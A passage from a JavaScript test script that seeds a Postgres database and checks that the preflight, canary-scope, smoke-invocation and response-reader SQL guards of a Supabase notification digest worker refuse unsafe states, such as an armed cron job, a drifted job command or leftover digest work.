  // The same blindness lets activation arm over an unverified canary that is in flight.
  await seedBaseline();
  await c.query(`INSERT INTO net.http_request_queue (url)
                 VALUES ('https://ficwbdrzefmblkbkomzw.supabase.co/functions/v1/notification-digest-worker')`);
  {
    const err = await preflight();
    rec('activation REFUSES while a canary invocation is queued but not yet started',
      !!err && err.includes('is queued'), err ?? 'it PASSED');
  }

  // ── canary_scope_verify.sql: what the canary ACTUALLY reached ─────────────
  // The pre-invocation ceiling bounds work visible at invocation time. Work committed between that
  // snapshot and materialization is sent by the same run and never counted — so the honest check is
  // after the fact, against the finished run's own durable rows.
  await seedBaseline();
  {
    const err = await scopeVerify();
    rec('canary_scope_verify PASSES for a one-recipient canary', err === null, err ?? '');
  }
  // The defect it exists for: a row that arrived after the ceiling was computed, materialized by the
  // same run, delivered to a second recipient.
  await seedBaseline();
  await c.query(`
    INSERT INTO public.notification_digest_groups
      (id, canonical_group_key, group_key_hash, channel, event_type, recipient_key,
       destination_fingerprint, recipient_timezone, digest_boundary_at, available_at, state,
       worker_run_id, terminal_at)
      VALUES (gen_random_uuid(), '{"late":1}'::jsonb, 'hash-late', 'email', 'open_slots_player',
              'rk-LATE-ARRIVAL', 'fp-late', 'Europe/Amsterdam', now(), now(), 'sent', '${RUN}', now())`);
  {
    const err = await scopeVerify();
    rec('canary_scope_verify REFUSES a run that reached a SECOND recipient',
      !!err && err.includes('the canary reached 2 recipient'), err ?? 'it PASSED');
    rec('...and says it has already sent', !!err && err.includes('ALREADY SENT'), err ?? '');
  }
  // A SPLIT is several chunk groups for ONE recipient. Counting groups instead of recipients would
  // refuse a perfectly good canary, which is a gate that gets switched off rather than heeded.
  await seedBaseline();
  await c.query(`
    INSERT INTO public.notification_digest_groups
      (id, canonical_group_key, group_key_hash, channel, event_type, recipient_key,
       destination_fingerprint, recipient_timezone, digest_boundary_at, available_at, state,
       chunk_ordinal, worker_run_id, terminal_at)
    SELECT gen_random_uuid(), jsonb_build_object('chunk', i), 'hash-chunk-' || i, 'email',
           'open_slots_player', 'rk-1', 'fp-1', 'Europe/Amsterdam', now(), now(), 'sent',
           i, '${RUN}', now()
      FROM generate_series(1, 3) i`);
  {
    const err = await scopeVerify();
    rec('canary_scope_verify counts RECIPIENTS, not chunk groups', err === null, err ?? '');
  }
  // An unfinished run has not reached its final scope, so passing it would be a verdict about a
  // moment rather than about the run.
  await seedBaseline();
  await c.query(`UPDATE public.notification_worker_runs SET ended_at = NULL WHERE run_id = '${RUN}'`);
  {
    const err = await scopeVerify();
    rec('canary_scope_verify REFUSES a run that has not finished',
      !!err && err.includes('FINISHED dispatch/email run'), err ?? 'it PASSED');
  }

  // ── smoke_invoke.sql: the same guarded invocation, one step earlier ──────
  // The disabled smoke carries the same Vault-decrypted bearer as the canary; DIGEST_SEND_ENABLED
  // stops the mail and does nothing for the credential. Its preconditions are the OPPOSITE of the
  // canary's — everything must still be inert — so they get their own scenarios.
  const smokeRefuses = async (name, mutate, needle) => {
    await seedBaseline();
    await c.query(`UPDATE public.notification_event_types SET digest_engine_enabled = false;
                   DELETE FROM public.notification_digest_groups WHERE terminal_at IS NULL;`);
    try { await mutate(); }
    catch (e) { return rec(name, false, `the scenario's own setup failed: ${e.message}`); }
    const before = await queuedCount();
    const err = await smokeInvoke();
    if (!err) return rec(name, false, 'the smoke PASSED — it would have posted the bearer');
    if (!err.includes(needle)) return rec(name, false, `refused for the wrong reason: ${err}`);
    const after = await queuedCount();
    rec(name, after === before, after === before ? '' : `it refused but queued ${after - before} request(s)`);
  };

  await seedBaseline();
  await c.query(`UPDATE public.notification_event_types SET digest_engine_enabled = false`);
  {
    const err = await smokeInvoke();
    rec('smoke_invoke PASSES on a fully inert world', err === null, err ?? '');
    const q = (await c.query(`SELECT url, headers ->> 'Authorization' AS a FROM net.http_request_queue`)).rows[0];
    rec('...posting to the REVIEWED endpoint from the job command itself',
      q?.url === 'https://ficwbdrzefmblkbkomzw.supabase.co/functions/v1/notification-digest-worker', q?.url ?? 'no request');
    rec('...with the bearer read from Vault at execution time, not a retyped one',
      q?.a === 'Bearer stub-key-not-a-real-credential', q?.a ?? 'no Authorization header');
  }

  // THE ASSERTIONS THAT BOUND THE DAMAGE if the operator's switch assertion is wrong. They do NOT
  // make sending impossible — the worker claims existing groups regardless of the engine flags, which
  // is why the engine-off check alone was not enough — they make the backlog empty at that instant.
  await smokeRefuses('smoke_invoke REFUSES once ANY engine is enabled',
    () => c.query(`UPDATE public.notification_event_types SET digest_engine_enabled = true
                    WHERE key = 'open_slots_player'`),
    'no event has the digest engine enabled');
  // THE ASSERTION THAT ACTUALLY BOUNDS THE SEND. `digest_engine_enabled` gates enqueue ROUTING only —
  // the worker never reads it, so a group left behind by an earlier attempt is claimed and sent.
  await smokeRefuses('smoke_invoke REFUSES when a live digest group exists',
    () => c.query(`
      INSERT INTO public.notification_digest_groups
        (id, canonical_group_key, group_key_hash, channel, event_type, recipient_key,
         destination_fingerprint, recipient_timezone, digest_boundary_at, available_at, state)
        VALUES (gen_random_uuid(), '{"left":1}'::jsonb, 'hash-left', 'email', 'open_slots_player',
                'rk-left', 'fp-left', 'Europe/Amsterdam', now(), now(), 'request_ready')`),
    'no live email digest group exists');

  // ...and the work that is not a group yet: materialization forms these without ever consulting the
  // event catalog, so an engine-off world is no protection at all.
  await smokeRefuses('smoke_invoke REFUSES when ungrouped pending digest work exists',
    () => c.query(`
      INSERT INTO public.notification_outbox
        (event_type, channel, recipient_person_id, idempotency_key, status, delivery_mode)
      VALUES ('open_slots_player', 'email', gen_random_uuid(), 'idem-left', 'pending', 'digest')`),
    'no ungrouped pending digest outbox row exists');

  await smokeRefuses('smoke_invoke REFUSES while the cron is ARMED',
    () => c.query(`UPDATE cron.job SET active = true`), 'or is ARMED');
  await smokeRefuses('smoke_invoke REFUSES a job whose command has DRIFTED',
    () => c.query(`UPDATE cron.job SET command = command || $x$ -- appended$x$`),
    'EXACTLY the reviewed command');
  await smokeRefuses('smoke_invoke REFUSES with a dispatch run in flight',
    () => c.query(`INSERT INTO public.notification_worker_runs (run_id, worker, channel, phase, started_at)
                   VALUES ('${OTHER_RUN}', 'notification-digest-worker', 'email', 'dispatch', now())`),
    'no dispatch run is in flight');

  // ── canary_invoke_response.sql: pg_net answers later, or not at all ───────
  const canaryResponse = async (id) => {
    const r = await runArtifact('canary_invoke_response.sql', { request_id: id });
    if (r.err) return { err: r.err };
    const all = Array.isArray(r.rows) ? r.rows : [r.rows];
    return { rows: all[all.length - 1]?.rows ?? [] };
  };
  await seedBaseline();
  await c.query(`INSERT INTO net.http_request_queue (id, url) VALUES (9001, 'https://x.test')`);
  {
    const r = await canaryResponse(9001);
    rec('the response reader RAISES while the reply is still outstanding',
      !!r.err && r.err.includes('has arrived'), r.err ?? 'it returned a result for a reply that had not arrived');
  }
  await c.query(`INSERT INTO net._http_response (id, status_code, content)
                 VALUES (9001, 200, '{"status":"ok","dispatchRunId":"${RUN}"}')`);
  {
    const r = await canaryResponse(9001);
    const markers = (r.rows ?? []).map((x) => x.canary_marker ?? '');
    rec('...and returns the status and body once it has', !r.err, r.err ?? '');
    rec('...as markers the dispatcher can read',
      markers.some((m) => m === 'CANARY_RESPONSE_STATUS=200')
        && markers.some((m) => m.includes('dispatchRunId')),
      JSON.stringify(markers));
  }
  // A transport failure records a row with NO status code. Rendering that as a bare empty marker
  // would let the caller's "is it 200?" test read a blank as something it recognises.
  await c.query(`INSERT INTO net.http_request_queue (id, url) VALUES (9002, 'https://x.test');
                 INSERT INTO net._http_response (id, status_code, content, error_msg)
                   VALUES (9002, NULL, NULL, E'connection\\nrefused')`);
  {
    const r = await canaryResponse(9002);
    const markers = (r.rows ?? []).map((x) => x.canary_marker ?? '');
    rec('a transport failure reads back as an explicit "none", on ONE line',
      markers.includes('CANARY_RESPONSE_STATUS=none')
        && markers.includes('CANARY_RESPONSE_ERROR=connection refused'),
      JSON.stringify(markers));
  }
} finally {
  await op?.end().catch(() => {});
  await c.end().catch(() => {});
  await epg.stop().catch(() => {});
}

console.log(`\n================  ${PASS} passed, ${FAIL} failed  ================\n`);
process.exit(FAIL === 0 ? 0 : 1);
